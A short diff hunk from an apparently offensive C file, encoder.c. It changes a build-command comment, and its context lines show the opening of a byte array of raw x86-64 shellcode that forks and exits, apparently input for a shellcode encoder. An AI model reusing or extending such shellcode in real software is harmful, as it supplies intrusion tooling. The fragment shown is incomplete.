@@ -2,7 +2,7 @@
 #include <stdlib.h>
 #include <unistd.h>
 
-# gcc encoder.c -o encoder
+// gcc encoder.c -o encoder
 
 unsigned char buf[] =
 "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31\xff\x6a\x3c"
